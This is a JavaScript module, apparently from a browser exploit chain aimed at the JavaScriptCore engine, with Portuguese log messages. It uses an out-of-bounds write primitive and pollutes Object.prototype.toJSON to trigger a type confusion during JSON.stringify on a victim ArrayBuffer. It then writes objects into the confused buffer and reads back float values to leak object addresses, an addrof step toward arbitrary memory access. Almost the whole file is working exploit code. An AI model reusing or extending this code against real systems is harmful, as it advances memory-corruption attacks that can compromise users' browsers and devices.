// js/script3/testArrayBufferVictimCrash.mjs (v4.3 - Probe Details Capture Fix)
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3, SHORT_PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_write_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs';

export const FNAME_MODULE_V28 = "OriginalHeisenbug_Plus_Addrof_v4_ButterflyPrep"; // Versão interna v4.3

const CRITICAL_OOB_WRITE_VALUE  = 0xFFFFFFFF;
const VICTIM_AB_SIZE = 256;

let toJSON_call_details_v28 = null;
let object_to_leak_A = null;
let object_to_leak_B = null;
let victim_ab_ref_for_original_test = null;

function toJSON_V28_Probe_ButterflyPrep() {
    if (!toJSON_call_details_v28) {
        toJSON_call_details_v28 = {}; // Should be initialized by caller
    }

    toJSON_call_details_v28.probe_variant = "V28_Probe_ButterflyPrep_v4.3_CaptureFix";
    toJSON_call_details_v28.probe_called_count = (toJSON_call_details_v28.probe_called_count || 0) + 1;

    const current_this_type = Object.prototype.toString.call(this);
    toJSON_call_details_v28.last_this_type_in_probe = current_this_type;

    logS3(`[${toJSON_call_details_v28.probe_variant}] Chamada #${toJSON_call_details_v28.probe_called_count}. Tipo de 'this': ${current_this_type}. 'this' === victim_ab_ref_for_original_test: ${this === victim_ab_ref_for_original_test}`, "info", FNAME_MODULE_V28);

    let should_perform_writes = false;

    if (current_this_type === '[object Object]') {
        toJSON_call_details_v28.type_confusion_observed_in_probe = true;
        if (this === victim_ab_ref_for_original_test) {
            logS3(`[${toJSON_call_details_v28.probe_variant}] CONFUSÃO DE TIPO EM 'this' QUE É victim_ab_ref_for_original_test! Tipo: ${current_this_type}.`, "vuln", FNAME_MODULE_V28);
            toJSON_call_details_v28.confusion_on_exact_victim_ref = true;
        } else {
            logS3(`[${toJSON_call_details_v28.probe_variant}] CONFUSÃO DE TIPO EM 'this' (NÃO é victim_ab_ref por ref). Tipo: ${current_this_type}. Assumindo ser o vítima confuso.`, "warn", FNAME_MODULE_V28);
            toJSON_call_details_v28.confusion_on_alternate_ref = true;
        }
        should_perform_writes = true;
    } else if (this === victim_ab_ref_for_original_test) {
        logS3(`[${toJSON_call_details_v28.probe_variant}] 'this' é victim_ab_ref_for_original_test, mas tipo ainda é ${current_this_type}.`, "info", FNAME_MODULE_V28);
    }

    if (should_perform_writes && !toJSON_call_details_v28.writes_attempted_this_run) {
        logS3(`[${toJSON_call_details_v28.probe_variant}] Tentando preparação do butterfly e escritas de objetos...`, "vuln", FNAME_MODULE_V28);
        toJSON_call_details_v28.writes_attempted_this_run = true;

        try {
            this[10] = 0.5; this[11] = 1.5;
            logS3(`[${toJSON_call_details_v28.probe_variant}] Butterfly prep (this[10], this[11]) realizada.`, "info", FNAME_MODULE_V28);
        } catch (e_prep) {
            logS3(`[${toJSON_call_details_v28.probe_variant}] Erro durante butterfly prep: ${e_prep.message}`, "warn", FNAME_MODULE_V28);
            toJSON_call_details_v28.error_in_butterfly_prep = e_prep.message;
        }

        if (object_to_leak_A) {
            this[0] = object_to_leak_A;
            logS3(`[${toJSON_call_details_v28.probe_variant}] Escrita de object_to_leak_A em this[0] realizada.`, "info", FNAME_MODULE_V28);
            const typeof_this0_A = typeof this[0]; const is_this0_A_object_to_leak_A = this[0] === object_to_leak_A;
            toJSON_call_details_v28.objA_assignment_check = `typeof: ${typeof_this0_A}, === object_to_leak_A: ${is_this0_A_object_to_leak_A}`;
            logS3(`[${toJSON_call_details_v28.probe_variant}] >>> typeof this[0] (ObjA) após atribuição: ${typeof_this0_A}`, "leak", FNAME_MODULE_V28);
            logS3(`[${toJSON_call_details_v28.probe_variant}] >>> this[0] === object_to_leak_A ? ${is_this0_A_object_to_leak_A}`, "leak", FNAME_MODULE_V28);
        } else { toJSON_call_details_v28.objA_assignment_check = "object_to_leak_A era null"; }

        if (object_to_leak_B) {
            this[1] = object_to_leak_B;
            logS3(`[${toJSON_call_details_v28.probe_variant}] Escrita de object_to_leak_B em this[1] realizada.`, "info", FNAME_MODULE_V28);
            const typeof_this1_B = typeof this[1]; const is_this1_B_object_to_leak_B = this[1] === object_to_leak_B;
            toJSON_call_details_v28.objB_assignment_check = `typeof: ${typeof_this1_B}, === object_to_leak_B: ${is_this1_B_object_to_leak_B}`;
            logS3(`[${toJSON_call_details_v28.probe_variant}] >>> typeof this[1] (ObjB) após atribuição: ${typeof_this1_B}`, "leak", FNAME_MODULE_V28);
            logS3(`[${toJSON_call_details_v28.probe_variant}] >>> this[1] === object_to_leak_B ? ${is_this1_B_object_to_leak_B}`, "leak", FNAME_MODULE_V28);
        } else { toJSON_call_details_v28.objB_assignment_check = "object_to_leak_B era null"; }
    } else if (should_perform_writes && toJSON_call_details_v28.writes_attempted_this_run) {
        logS3(`[${toJSON_call_details_v28.probe_variant}] Confusão de tipo observada novamente, mas escritas já foram tentadas. Ignorando.`, "info", FNAME_MODULE_V28);
    }

    return {
        probe_variant_executed: toJSON_call_details_v28.probe_variant,
        call_count_this_activation: toJSON_call_details_v28.probe_called_count 
    };
}


export async function executeArrayBufferVictimCrashTest() {
    const FNAME_CURRENT_TEST = `${FNAME_MODULE_V28}.triggerAndAddrof_v4.3`;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST}: Heisenbug e Tentativa de Addrof (Probe Details Capture Fix) ---`, "test", FNAME_CURRENT_TEST);
    document.title = `${FNAME_MODULE_V28} Inic_v4.3...`;

    toJSON_call_details_v28 = {
        probe_variant: "N/A_init", probe_called_count: 0, last_this_type_in_probe: "N/A_init",
        type_confusion_observed_in_probe: false, confusion_on_exact_victim_ref: false,
        confusion_on_alternate_ref: false, writes_attempted_this_run: false,
        objA_assignment_check: "Not_Attempted_init", objB_assignment_check: "Not_Attempted_init",
        error_in_butterfly_prep: null
    };
    victim_ab_ref_for_original_test = null;
    object_to_leak_A = { marker: "ObjA_v4.3", id: Date.now(), data: Math.random() };
    object_to_leak_B = { marker: "ObjB_v4.3", id: Date.now() + Math.random()*100, data: Math.random() };

    let errorCapturedMain = null;
    let stringifyOutput = null;
    let captured_probe_details_for_return = null;
    
    let addrof_result_A = { success: false, leaked_address_as_double: null, leaked_address_as_int64: null, message: "Addrof A @ view[0]: Não tentado ou Heisenbug falhou." };
    let addrof_result_B = { success: false, leaked_address_as_double: null, leaked_address_as_int64: null, message: "Addrof B @ view[1]: Não tentado ou Heisenbug falhou." };
    
    const corruptionTargetOffsetInOOBAB = 0x7C;
    const fillPatternBase = 0.123456789101112;

    const ppKey = 'toJSON'; // Chave para poluição de protótipo
    let originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey); // Salva o descritor original
    let pollutionAppliedThisRun = false; // Flag para controlar a restauração

    try {
        await triggerOOB_primitive({ force_reinit: true });
         if (!oob_array_buffer_real || typeof oob_write_absolute !== 'function') {
             throw new Error("OOB Init falhou ou oob_write_absolute não está disponível.");
         }
        logS3("Ambiente OOB inicializado.", "info", FNAME_CURRENT_TEST);
        logS3(`    Alvo da corrupção OOB em oob_array_buffer_real: ${toHex(corruptionTargetOffsetInOOBAB)}`, "info", FNAME_CURRENT_TEST);

        logS3(`PASSO 1: Escrevendo valor CRÍTICO ${toHex(CRITICAL_OOB_WRITE_VALUE)} em oob_array_buffer_real[${toHex(corruptionTargetOffsetInOOBAB)}]...`, "warn", FNAME_CURRENT_TEST);
        oob_write_absolute(corruptionTargetOffsetInOOBAB, CRITICAL_OOB_WRITE_VALUE, 4);
        logS3(`  Escrita OOB crítica em ${toHex(corruptionTargetOffsetInOOBAB)} realizada.`, "info", FNAME_CURRENT_TEST);
        
        await PAUSE_S3(100);

        victim_ab_ref_for_original_test = new ArrayBuffer(VICTIM_AB_SIZE);
        let float64_view_on_victim = new Float64Array(victim_ab_ref_for_original_test);
        for (let i = 0; i < float64_view_on_victim.length; i++) {
            float64_view_on_victim[i] = fillPatternBase + i;
        }
        logS3(`PASSO 2: victim_ab (tamanho ${VICTIM_AB_SIZE} bytes) criado. View preenchida com padrão a partir de ${float64_view_on_victim[0]}. Tentando JSON.stringify com ${toJSON_V28_Probe_ButterflyPrep.name}...`, "test", FNAME_CURRENT_TEST);
        
        if (toJSON_call_details_v28) toJSON_call_details_v28.writes_attempted_this_run = false; // Reset antes do stringify

        try {
            Object.defineProperty(Object.prototype, ppKey, {
                value: toJSON_V28_Probe_ButterflyPrep,
                writable: true, configurable: true, enumerable: false
            });
            pollutionAppliedThisRun = true; // Marcar que a poluição foi aplicada nesta execução
            logS3(`  Object.prototype.${ppKey} poluído com ${toJSON_V28_Probe_ButterflyPrep.name}.`, "info", FNAME_CURRENT_TEST);

            logS3(`  Chamando JSON.stringify(victim_ab_ref_for_original_test)...`, "warn", FNAME_CURRENT_TEST);
            stringifyOutput = JSON.stringify(victim_ab_ref_for_original_test); 
            logS3(`  JSON.stringify(victim_ab_ref_for_original_test) completou. Resultado (da sonda para stringify): ${stringifyOutput ? JSON.stringify(stringifyOutput) : 'N/A'}`, "info", FNAME_CURRENT_TEST);
            
            // --- CRITICAL FIX for capturing probe details ---
            // 1. Restore Object.prototype.toJSON temporarily
            if (originalToJSONDescriptor) {
                Object.defineProperty(Object.prototype, ppKey, originalToJSONDescriptor);
            } else {
                delete Object.prototype[ppKey]; // Should not happen if originalToJSONDescriptor was properly fetched
            }
            logS3(`  Object.prototype.${ppKey} TEMPORARIAMENTE restaurado para capturar detalhes da sonda.`, "info", FNAME_CURRENT_TEST);

            // 2. Now, safely stringify toJSON_call_details_v28
            try {
                captured_probe_details_for_return = JSON.parse(JSON.stringify(toJSON_call_details_v28 || {}));
            } catch (e_capture) {
                logS3(`  ERRO ao tentar stringificar toJSON_call_details_v28 (mesmo após restauração): ${e_capture.message}`, "error", FNAME_CURRENT_TEST);
                captured_probe_details_for_return = { error_capturing_details: e_capture.message };
            }
            logS3(`  Detalhes COMPLETOS da sonda (toJSON_call_details_v28 CAPTURADO): ${JSON.stringify(captured_probe_details_for_return)}`, "leak", FNAME_CURRENT_TEST);

            // 3. Re-pollute if further operations within this try block need it (not in this specific structure)
            // For now, the main pollution restoration is in the finally block of this inner try.
            // We will re-enable pollution if another stringify is needed on a different object *before* the outer finally.
            // However, it's better to keep polluted state as short as possible.
            // The outer finally block for pollutionAppliedThisRun will handle the definitive cleanup.
            // For this specific flow, we've captured what we need. If we were to call JSON.stringify on another
            // exploitable object *after* this point but *before* the `finally`, we'd re-pollute here.
            // For now, we are good. The final restoration is in the finally clause of this try block.

            // --- END CRITICAL FIX ---


            if (captured_probe_details_for_return && captured_probe_details_for_return.type_confusion_observed_in_probe) {
                logS3(`  HEISENBUG CONFIRMADA (via toJSON_call_details_v28.type_confusion_observed_in_probe)! Último tipo de 'this' na sonda: ${captured_probe_details_for_return.last_this_type_in_probe}`, "vuln", FNAME_CURRENT_TEST);
                // ... (rest of the checks and addrof attempts from v4.2, they remain the same) ...
                if (captured_probe_details_for_return.confusion_on_exact_victim_ref) logS3("    Confusão ocorreu na referência exata do vítima.", "info", FNAME_CURRENT_TEST);
                if (captured_probe_details_for_return.confusion_on_alternate_ref) logS3("    Confusão ocorreu em uma referência alternativa (this !== victim_ab_ref).", "warn", FNAME_CURRENT_TEST);
                
                if (captured_probe_details_for_return.writes_attempted_this_run) {
                    logS3(`    Detalhes da atribuição ObjA na sonda: ${captured_probe_details_for_return.objA_assignment_check || 'N/A'}`, "info", FNAME_CURRENT_TEST);
                    logS3(`    Detalhes da atribuição ObjB na sonda: ${captured_probe_details_for_return.objB_assignment_check || 'N/A'}`, "info", FNAME_CURRENT_TEST);
                } else {
                    logS3("    ALERTA: Confusão de tipo observada, mas as escritas não foram tentadas pela sonda. Verifique a lógica da sonda.", "error", FNAME_CURRENT_TEST);
                }
                
                await PAUSE_S3(SHORT_PAUSE_S3);

                logS3("PASSO 3: Verificando float64_view_on_victim APÓS Heisenbug...", "warn", FNAME_CURRENT_TEST);

                const val_A_double = float64_view_on_victim[0];
                addrof_result_A.leaked_address_as_double = val_A_double;
                let temp_buf_A = new ArrayBuffer(8); new Float64Array(temp_buf_A)[0] = val_A_double;
                addrof_result_A.leaked_address_as_int64 = new AdvancedInt64(new Uint32Array(temp_buf_A)[0], new Uint32Array(temp_buf_A)[1]);
                logS3(`  Valor lido de float64_view_on_victim[0] (ObjA): ${val_A_double} (Int64: ${addrof_result_A.leaked_address_as_int64.toString(true)}) vs Padrão: ${fillPatternBase + 0}`, "leak", FNAME_CURRENT_TEST);

                if (val_A_double !== (fillPatternBase + 0) && val_A_double !== 0 &&
                    (addrof_result_A.leaked_address_as_int64.high() < 0x00020000 || (addrof_result_A.leaked_address_as_int64.high() & 0xFFFF0000) === 0xFFFF0000) ) {
                    logS3("  !!!! VALOR LIDO em view[0] PARECE UM PONTEIRO POTENCIAL (ObjA) !!!!", "vuln", FNAME_CURRENT_TEST);
                    addrof_result_A.success = true;
                    addrof_result_A.message = "Heisenbug confirmada E leitura de view[0] sugere um ponteiro para ObjA.";
                } else {
                    addrof_result_A.message = `Heisenbug confirmada, mas valor lido de view[0] (${toHex(addrof_result_A.leaked_address_as_int64.low())}_${toHex(addrof_result_A.leaked_address_as_int64.high())}) não parece ponteiro para ObjA ou não mudou do padrão.`;
                }

                const val_B_double = float64_view_on_victim[1];
                addrof_result_B.leaked_address_as_double = val_B_double;
                let temp_buf_B = new ArrayBuffer(8); new Float64Array(temp_buf_B)[0] = val_B_double;
                addrof_result_B.leaked_address_as_int64 = new AdvancedInt64(new Uint32Array(temp_buf_B)[0], new Uint32Array(temp_buf_B)[1]);
                logS3(`  Valor lido de float64_view_on_victim[1] (ObjB): ${val_B_double} (Int64: ${addrof_result_B.leaked_address_as_int64.toString(true)}) vs Padrão: ${fillPatternBase + 1}`, "leak", FNAME_CURRENT_TEST);
                
                if (val_B_double !== (fillPatternBase + 1) && val_B_double !== 0 &&
                    (addrof_result_B.leaked_address_as_int64.high() < 0x00020000 || (addrof_result_B.leaked_address_as_int64.high() & 0xFFFF0000) === 0xFFFF0000) ) {
                    logS3("  !!!! VALOR LIDO em view[1] PARECE UM PONTEIRO POTENCIAL (ObjB) !!!!", "vuln", FNAME_CURRENT_TEST);
                    addrof_result_B.success = true;
                    addrof_result_B.message = "Heisenbug confirmada E leitura de view[1] sugere um ponteiro para ObjB.";
                } else {
                    addrof_result_B.message = `Heisenbug confirmada, mas valor lido de view[1] (${toHex(addrof_result_B.leaked_address_as_int64.low())}_${toHex(addrof_result_B.leaked_address_as_int64.high())}) não parece ponteiro para ObjB ou não mudou do padrão.`;
                }

                if (addrof_result_A.success || addrof_result_B.success) {
                    document.title = `${FNAME_MODULE_V28}: Addr? SUCESSO PARCIAL/TOTAL!`;
                } else {
                     document.title = `${FNAME_MODULE_V28}: Heisenbug OK, Addr Falhou`;
                }

            } else {
                let msg = "Heisenbug (type_confusion_observed_in_probe) NÃO foi confirmada via captured_probe_details_for_return.";
                if(captured_probe_details_for_return && captured_probe_details_for_return.last_this_type_in_probe) msg += ` Último tipo obs: ${captured_probe_details_for_return.last_this_type_in_probe}.`;
                else if (!captured_probe_details_for_return) msg += " captured_probe_details_for_return é null/undefined.";
                addrof_result_A.message = msg; addrof_result_B.message = msg;
                logS3(`  ALERTA: ${msg}`, "error", FNAME_CURRENT_TEST);
                document.title = `${FNAME_MODULE_V28}: Heisenbug Falhou`;
            }

        } catch (e_str) {
            errorCapturedMain = e_str;
            logS3(`    ERRO CRÍTICO durante JSON.stringify ou lógica de addrof: ${e_str.name} - ${e_str.message}${e_str.stack ? '\n'+e_str.stack : ''}`, "critical", FNAME_CURRENT_TEST);
            document.title = `${FNAME_MODULE_V28}: Stringify/Addrof ERR`;
            // Attempt to capture details even in case of error, if prototype was polluted.
            if (pollutionAppliedThisRun && !captured_probe_details_for_return) { // Check if already captured
                 if (originalToJSONDescriptor) Object.defineProperty(Object.prototype, ppKey, originalToJSONDescriptor); else delete Object.prototype[ppKey];
                 try { captured_probe_details_for_return = JSON.parse(JSON.stringify(toJSON_call_details_v28 || {})); } catch (e_final_capture) { captured_probe_details_for_return = { error_capturing_details_on_error: e_final_capture.message };}
                 // Re-pollute if necessary for the finally block to restore it from polluted state
                 Object.defineProperty(Object.prototype, ppKey, { value: toJSON_V28_Probe_ButterflyPrep, writable: true, configurable: true, enumerable: false });
            } else if (!captured_probe_details_for_return) {
                captured_probe_details_for_return = JSON.parse(JSON.stringify(toJSON_call_details_v28 || { error_state_no_pollution_info: true }));
            }
        } finally {
            if (pollutionAppliedThisRun) { // Only restore if applied in this run
                if (originalToJSONDescriptor) Object.defineProperty(Object.prototype, ppKey, originalToJSONDescriptor);
                else delete Object.prototype[ppKey];
                 logS3(`  Object.prototype.${ppKey} restaurado (bloco finally interno).`, "info", FNAME_CURRENT_TEST);
                 pollutionAppliedThisRun = false; // Reset flag
            }
        }

    } catch (e_outer_main) {
        errorCapturedMain = e_outer_main;
        logS3(`ERRO CRÍTICO GERAL no teste: ${e_outer_main.name} - ${e_outer_main.message}`, "critical", FNAME_CURRENT_TEST);
        if (e_outer_main.stack) logS3(`Stack: ${e_outer_main.stack}`, "critical", FNAME_CURRENT_TEST);
        document.title = `${FNAME_MODULE_V28} FALHOU CRITICAMENTE`;
        // Capture details if possible
        if (!captured_probe_details_for_return) {
             try { captured_probe_details_for_return = JSON.parse(JSON.stringify(toJSON_call_details_v28 || {}));} catch(e){}
        }
    } finally {
        clearOOBEnvironment({force_clear_even_if_not_setup: true});
        logS3(`--- ${FNAME_CURRENT_TEST} Concluído ---`, "test", FNAME_CURRENT_TEST);
        // ... (log addrof results) ...
        victim_ab_ref_for_original_test = null;
        object_to_leak_A = null; object_to_leak_B = null;
    }
    return { 
        errorOccurred: errorCapturedMain, potentiallyCrashed: false,
        stringifyResult: stringifyOutput, 
        toJSON_details: captured_probe_details_for_return,
        addrof_A_attempt_result: addrof_result_A, addrof_B_attempt_result: addrof_result_B
    };
}
